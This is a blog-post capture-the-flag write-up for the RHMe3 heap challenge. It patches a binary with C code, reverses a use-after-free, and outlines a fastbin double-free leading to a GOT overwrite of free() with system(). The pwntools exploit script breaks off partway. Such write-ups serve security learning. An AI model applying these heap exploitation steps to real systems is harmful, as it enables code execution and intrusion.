<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>RHMe3 Qualifier - Heap Exploitaiton</title>
  <meta name="description" content="Hi,">

  <link rel="stylesheet" href="/binholic/assets/css/main.css">
  <link rel="canonical" href="/binholic/2017/08/30/rhme3-qualifier-heap-exploitaiton.html">
  <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/binholic/feed.xml">
</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/binholic/">Binary World for Binary People :)</a>

    <!--
    <h2 class="site-subtitle">
        <span class="site-subtitle-quote">"empty
"</span>
        <span class="site-subtitle-author">- no_author -</span>
    </h2>
    -->

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      
      <div class="trigger">
        
          
          <a class="page-link" href="/binholic/about/">About</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <a class="page-link" href="/binholic/blog/">Blog</a>
      </div>
      
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">RHMe3 Qualifier - Heap Exploitaiton</h1>
    <p class="post-meta"><time datetime="2017-08-30T00:06:00+02:00" itemprop="datePublished">Aug 30, 2017</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">m_101</span></span></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p>Hi,</p>

<p>This year, Riscure organized a CTF composed of 3 challenges : 2 crypto challenges and 1 exploitation challenge.
I only did the exploitation challenge.</p>

<p>We’ll start by patching the binary in order to run it on our box. Then reversing the binary and finally exploiting it. We’ll use radare2 for the whole analysis.</p>

<h1 id="patching">Patching</h1>

<p>In the background_process() daemonize() functions, there are some functions calls that cause the program to exit() if the conditions are not met.</p>

<h2 id="background_process-function">background_process() function</h2>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
</pre></td><td class="code"><pre>[0x00400ec0]&gt; pdf @ sym.background_process 
/ (fcn) sym.background_process 236
|   sym.background_process ();
|           ; var int local_128h @ rbp-0x128
|           ; var int local_118h @ rbp-0x118
|           ; var int local_110h @ rbp-0x110
|           ; var int local_8h @ rbp-0x8
|              ; CALL XREF from 0x004021b2 (main)
|           0x00401033      55             push rbp
|           0x00401034      4889e5         mov rbp, rsp
|           0x00401037      4881ec300100.  sub rsp, 0x130
|           0x0040103e      4889bdd8feff.  mov qword [local_128h], rdi
|           0x00401045      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x44a8 ; '('
|           0x0040104e      488945f8       mov qword [local_8h], rax
|           0x00401052      31c0           xor eax, eax
|           0x00401054      488b85d8feff.  mov rax, qword [local_128h]
|           0x0040105b      4889c7         mov rdi, rax
|           0x0040105e      e82dfdffff     call sym.imp.getpwnam
|           0x00401063      488985e8feff.  mov qword [local_118h], rax
|           0x0040106a      4883bde8feff.  cmp qword [local_118h], 0
|       ,=&lt; 0x00401072      750a           jne 0x40107e
|       |   0x00401074      bf01000000     mov edi, 1
|       |   0x00401079      e8f2fdffff     call sym.imp.exit           ; void exit(int status)
|       |      ; JMP XREF from 0x00401072 (sym.background_process)
|       `-&gt; 0x0040107e      488b95d8feff.  mov rdx, qword [local_128h]
|           0x00401085      488d85f0feff.  lea rax, qword [local_110h]
|           0x0040108c      be44234000     mov esi, str._opt_riscure__s ; 0x402344 ; "/opt/riscure/%s"
|           0x00401091      4889c7         mov rdi, rax
|           0x00401094      b800000000     mov eax, 0
|           0x00401099      e8b2fdffff     call sym.imp.sprintf        ; int sprintf(char *s,
|           0x0040109e      488d85f0feff.  lea rax, qword [local_110h]
|           0x004010a5      4889c7         mov rdi, rax
|           0x004010a8      e809ffffff     call sym.daemonize
|           0x004010ad      be00000000     mov esi, 0
|           0x004010b2      bf00000000     mov edi, 0
|           0x004010b7      e884fcffff     call sym.imp.setgroups
|           0x004010bc      85c0           test eax, eax
|       ,=&lt; 0x004010be      790a           jns 0x4010ca
|       |   0x004010c0      bf01000000     mov edi, 1
|       |   0x004010c5      e8a6fdffff     call sym.imp.exit           ; void exit(int status)
|       |      ; JMP XREF from 0x004010be (sym.background_process)
|       `-&gt; 0x004010ca      488b85e8feff.  mov rax, qword [local_118h]
|           0x004010d1      8b4014         mov eax, dword [rax + 0x14] ; [0x14:4]=1
|           0x004010d4      89c7           mov edi, eax
|           0x004010d6      e835fdffff     call sym.imp.setgid
|           0x004010db      85c0           test eax, eax
|       ,=&lt; 0x004010dd      790a           jns 0x4010e9
|       |   0x004010df      bf01000000     mov edi, 1
|       |   0x004010e4      e887fdffff     call sym.imp.exit           ; void exit(int status)
|       |      ; JMP XREF from 0x004010dd (sym.background_process)
|       `-&gt; 0x004010e9      488b85e8feff.  mov rax, qword [local_118h]
|           0x004010f0      8b4010         mov eax, dword [rax + 0x10] ; [0x10:4]=0x3e0002
|           0x004010f3      89c7           mov edi, eax
|           0x004010f5      e886fdffff     call sym.imp.setuid
|           0x004010fa      85c0           test eax, eax
|       ,=&lt; 0x004010fc      790a           jns 0x401108
|       |   0x004010fe      bf01000000     mov edi, 1
|       |   0x00401103      e868fdffff     call sym.imp.exit           ; void exit(int status)
|       |      ; JMP XREF from 0x004010fc (sym.background_process)
|       `-&gt; 0x00401108      90             nop
|           0x00401109      488b45f8       mov rax, qword [local_8h]
|           0x0040110d      644833042528.  xor rax, qword fs:[0x28]
|       ,=&lt; 0x00401116      7405           je 0x40111d
|       |   0x00401118      e8a3fbffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       |      ; JMP XREF from 0x00401116 (sym.background_process)
|       `-&gt; 0x0040111d      c9             leave
\           0x0040111e      c3             ret</pre></td></tr></tbody></table></code></pre></figure>

<h2 id="deamonize-function">deamonize() function</h2>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre></td><td class="code"><pre>[0x00400ec0]&gt; pdf @ sym.daemonize 
/ (fcn) sym.daemonize 125
|   sym.daemonize ();
|           ; var int local_18h @ rbp-0x18
|           ; var int local_8h @ rbp-0x8
|           ; var int local_4h @ rbp-0x4
|              ; CALL XREF from 0x004010a8 (sym.background_process)
|           0x00400fb6      55             push rbp
|           0x00400fb7      4889e5         mov rbp, rsp
|           0x00400fba      4883ec20       sub rsp, 0x20
|           0x00400fbe      48897de8       mov qword [local_18h], rdi
|           0x00400fc2      e899feffff     call sym.imp.getppid
|           0x00400fc7      83f801         cmp eax, 1
|       ,=&lt; 0x00400fca      7464           je 0x401030
|       |   0x00400fcc      e8bffeffff     call sym.imp.fork
|       |   0x00400fd1      8945f8         mov dword [local_8h], eax
|       |   0x00400fd4      837df800       cmp dword [local_8h], 0
|      ,==&lt; 0x00400fd8      790a           jns 0x400fe4
|      ||   0x00400fda      bf01000000     mov edi, 1
|      ||   0x00400fdf      e88cfeffff     call sym.imp.exit           ; void exit(int status)
|      ||      ; JMP XREF from 0x00400fd8 (sym.daemonize)
|      `--&gt; 0x00400fe4      837df800       cmp dword [local_8h], 0
|      ,==&lt; 0x00400fe8      7e0a           jle 0x400ff4
|      ||   0x00400fea      bf00000000     mov edi, 0
|      ||   0x00400fef      e87cfeffff     call sym.imp.exit           ; void exit(int status)
|      ||      ; JMP XREF from 0x00400fe8 (sym.daemonize)
|      `--&gt; 0x00400ff4      e857fdffff     call sym.imp.setsid
|       |   0x00400ff9      8945fc         mov dword [local_4h], eax
|       |   0x00400ffc      837dfc00       cmp dword [local_4h], 0
|      ,==&lt; 0x00401000      790a           jns 0x40100c
|      ||   0x00401002      bf01000000     mov edi, 1
|      ||   0x00401007      e864feffff     call sym.imp.exit           ; void exit(int status)
|      ||      ; JMP XREF from 0x00401000 (sym.daemonize)
|      `--&gt; 0x0040100c      bf00000000     mov edi, 0
|       |   0x00401011      e88afdffff     call sym.imp.umask          ; int umask(int m)
|       |   0x00401016      488b45e8       mov rax, qword [local_18h]
|       |   0x0040101a      4889c7         mov rdi, rax
|       |   0x0040101d      e88efcffff     call sym.imp.chdir
|       |   0x00401022      85c0           test eax, eax
|      ,==&lt; 0x00401024      790b           jns 0x401031
|      ||   0x00401026      bf01000000     mov edi, 1
|      ||   0x0040102b      e840feffff     call sym.imp.exit           ; void exit(int status)
|      ||      ; JMP XREF from 0x00400fca (sym.daemonize)
|      |`-&gt; 0x00401030      90             nop
|      |       ; JMP XREF from 0x00401024 (sym.daemonize)
|      `--&gt; 0x00401031      c9             leave
\           0x00401032      c3             ret</pre></td></tr></tbody></table></code></pre></figure>

<p>The calls to patch:</p>
<ul>
  <li>getppid()</li>
  <li>setgroups()</li>
  <li>setgid()</li>
  <li>setuid()</li>
  <li>getpwname() (i didn’t patch it, i created the user)</li>
  <li>chdir() (i didn’t patch it, i created the user)</li>
</ul>

<p>For the patching, I wrote a simple C program that does the job, it searches for signatures and then patch it.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
</pre></td><td class="code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">int</span> <span class="nf">patch_once</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">needle</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len_needle</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mod</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len_mod</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">found</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">cur_off</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">rewinded</span><span class="p">;</span>

    <span class="n">fseek</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>

    <span class="c1">// look for needle</span>
    <span class="n">rewinded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="n">cur_off</span> <span class="o">=</span> <span class="n">ftell</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
        <span class="n">memset</span> <span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">buf</span><span class="p">));</span>
        <span class="n">ptr</span> <span class="o">=</span> <span class="n">fgets</span> <span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">fp</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ptr</span><span class="p">)</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="c1">//printf ("cur_off : %d\n", cur_off);</span>

        <span class="c1">// look for needle</span>
        <span class="n">found</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">buf</span><span class="p">);</span> <span class="n">idx</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">==</span> <span class="o">*</span><span class="n">needle</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">//printf ("Got first char at %d\n", cur_off + idx);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span> <span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">idx</span><span class="p">,</span> <span class="n">needle</span><span class="p">,</span> <span class="n">len_needle</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">printf</span> <span class="p">(</span><span class="s">"[+] Found needle</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                    <span class="n">found</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">else</span> <span class="p">{</span>
                    <span class="c1">// if we already checked the untruncated buffer</span>
                    <span class="c1">// then move forward</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">rewinded</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">fseek</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">cur_off</span> <span class="o">+</span> <span class="n">idx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
                        <span class="n">rewinded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="c1">// we rewind fully in order to get untruncated buffer</span>
                    <span class="k">else</span> <span class="p">{</span>
                        <span class="n">fseek</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">cur_off</span> <span class="o">+</span> <span class="n">idx</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
                        <span class="n">rewinded</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>

                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="c1">// if we found the needle</span>
        <span class="c1">// then patch it</span>
        <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">found</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span> <span class="p">(</span><span class="s">"[+] Patched at %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cur_off</span> <span class="o">+</span> <span class="n">found</span><span class="p">);</span>
            <span class="n">fseek</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">cur_off</span> <span class="o">+</span> <span class="n">found</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
            <span class="n">fwrite</span> <span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">len_mod</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">ptr</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
    <span class="c1">// patch for getppid in daemonize()</span>
    <span class="kt">char</span> <span class="n">getppid_sig</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x74\x64\xe8\xbf\xfe\xff\xff</span><span class="s">"</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">getppid_patch</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x75\x64\xe8\xbf\xfe\xff\xff</span><span class="s">"</span><span class="p">;</span>
    <span class="c1">// patch for setgroups in background_process()</span>
    <span class="kt">char</span> <span class="n">setgroups_sig</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xe8\x84\xfc\xff\xff\x85\xc0\x79\x0a</span><span class="s">"</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">setgroups_patch</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xe8\x84\xfc\xff\xff\x85\xc0\x78\x0a</span><span class="s">"</span><span class="p">;</span>
    <span class="c1">// patch for setgid in background_process()</span>
    <span class="kt">char</span> <span class="n">setgid_sig</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xe8\x35\xfd\xff\xff\x85\xc0\x79\x0a</span><span class="s">"</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">setgid_patch</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xe8\x35\xfd\xff\xff\x85\xc0\x78\x0a</span><span class="s">"</span><span class="p">;</span>
    <span class="c1">// patch for setuid in background_process()</span>
    <span class="kt">char</span> <span class="n">setuid_sig</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xe8\x86\xfd\xff\xff\x85\xc0\x79\x0a</span><span class="s">"</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">setuid_patch</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xe8\x86\xfd\xff\xff\x85\xc0\x78\x0a</span><span class="s">"</span><span class="p">;</span>

    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span> <span class="p">(</span><span class="s">"./pwn.elf"</span><span class="p">,</span> <span class="s">"r+"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span> <span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Failed opening file</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">printf</span> <span class="p">(</span><span class="s">"[+] Patching getppid</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">patch_once</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">getppid_sig</span><span class="p">,</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">getppid_sig</span><span class="p">),</span> <span class="n">getppid_patch</span><span class="p">,</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">getppid_patch</span><span class="p">));</span>

    <span class="n">printf</span> <span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Patching setgroups</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">patch_once</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">setgroups_sig</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">setgroups_sig</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">setgroups_patch</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">setgroups_patch</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>

    <span class="n">printf</span> <span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Patching setgid</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">patch_once</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">setgid_sig</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">setgid_sig</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">setgid_patch</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">setgid_patch</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>

    <span class="n">printf</span> <span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Patching setuid</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">patch_once</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">setuid_sig</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">setuid_sig</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">setuid_patch</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">setuid_patch</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>

    <span class="n">fclose</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Create the pwn user and the “/opt/riscure/pwn/” directory (unless you patch it ;)).
Now we can run the binary on our machine.</p>

<h1 id="reversing">Reversing</h1>
<p>Based on the menu we got:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre>$ ./main.elf
Welcome to your TeamManager (TM)!
0.- Exit
1.- Add player
2.- Remove player
3.- Select player
4.- Edit player
5.- Show player
6.- Show team
Your choice:</pre></td></tr></tbody></table></code></pre></figure>

<p>Through reversing the functions, we get the following structure for a player:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="code"><pre>struct player_s {
    int attack;
    int defense;
    int speed;
    int precision;
    char *name;
};</pre></td></tr></tbody></table></code></pre></figure>

<p>The whole program purpose is to manipulate that structure and an array that has room for 10 pointers to this type of object.</p>

<p>Looking quickly at functions, we’ll find that:</p>
<ul>
  <li>select_player() takes a non NULL pointer from an array of player, we’ll call this the selected player</li>
  <li>del_player() reset the selected player index to NULL but doesn’t NULL the selected player</li>
  <li>Lots of functions re-use this selected player pointer, we got a use-after-free situation</li>
</ul>

<p>We can see where the UAF happens through cross references:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="code"><pre>[0x00400ec0]&gt; axt obj.selected
data 0x401e42 mov rbx, qword obj.selected in sym.set_attack
data 0x401c96 mov qword obj.selected, rax in sym.select_player
data 0x401cb6 mov rax, qword obj.selected in sym.select_player
data 0x401fc1 mov rbx, qword obj.selected in sym.set_precision
data 0x4020cb mov rax, qword obj.selected in sym.show_player
data 0x4020f2 mov rax, qword obj.selected in sym.show_player
data 0x401ec1 mov rbx, qword obj.selected in sym.set_defense
data 0x401d3a mov rax, qword obj.selected in sym.set_name
data 0x401db9 mov rax, qword obj.selected in sym.set_name
data 0x401d65 mov rax, qword obj.selected in sym.set_name
data 0x401da7 mov rax, qword obj.selected in sym.set_name
data 0x401fff mov rax, qword obj.selected in sym.edit_player
data 0x401f41 mov rbx, qword obj.selected in sym.set_speed</pre></td></tr></tbody></table></code></pre></figure>

<p>Through this UAF we can cause a fastbins double-free situation:</p>
<ul>
  <li>name then the player structure is free()</li>
  <li>realloc() is called in edit_player(), we can use this to provoke another free on name :)</li>
</ul>

<h1 id="exploitation">Exploitation</h1>

<p>The game plan:</p>
<ul>
  <li>create 1 player with our command and 2 players with a small name (&lt; 10 chars), 1 player will serve as a barrier so we don’t have the top chunk just after our victim player, even though fastbins are only consolidated through malloc_consolidate() after hitting a threshold</li>
  <li>Now we have player 0, player 1 and player 2.</li>
  <li>select player 1 (our victim player)</li>
  <li>delete player 1 (1st free : free (name); free (header))</li>
  <li>Use the UAF to edit player 1 with a “big” name (50 chars here, still fastbin), this will free name again through realloc() : double free since we got free (name); free (header); free (name).</li>
</ul>

<p>realloc() free the smaller buffer as it is not enough to store our bigger name. It then allocate a bigger buffer after player 2.</p>

<p>From there it’s a classic fastbins double-free attack.
I created an overlap between a header and a controlled name. This allows to read and write memory.
We leak a GOT entry, calculate libc base address and overwrite free() entry with system().</p>

<ul>
  <li>Now free player 0 to execute your command stored there.</li>
</ul>

<p>The exploit</p>

<p>Here it is.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
</pre></td><td class="code"><pre><span class="c1">#!/usr/bin/python2
</span>
<span class="s">'''
author : m_101
desc   : exploit for Riscure RHME 3 heap challenge
date   : 21/08/2017
'''</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="k">def</span> <span class="nf">recv_all</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">1</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="s">''</span>
    <span class="k">while</span> <span class="n">target</span><span class="o">.</span><span class="n">can_recv</span> <span class="p">(</span><span class="n">timeout</span><span class="p">):</span>
        <span class="n">result</span> <span class="o">+=</span> <span class="n">target</span><span class="o">.</span><span class="n">recv</span> <span class="p">()</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="k">def</span> <span class="nf">add_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">attack</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">defense</span> <span class="o">=</span> <span class="mi">2</span><span class="p">,</span> <span class="n">speed</span> <span class="o">=</span> <span class="mi">3</span><span class="p">,</span> <span class="n">precision</span> <span class="o">=</span> <span class="mi">4</span><span class="p">):</span>
    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">d'</span> <span class="o">%</span> <span class="n">attack</span><span class="p">)</span>
    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">d'</span> <span class="o">%</span> <span class="n">defense</span><span class="p">)</span>
    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">d'</span> <span class="o">%</span> <span class="n">speed</span><span class="p">)</span>
    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">d'</span> <span class="o">%</span> <span class="n">precision</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">del_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">d'</span> <span class="o">%</span> <span class="n">index</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">select_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
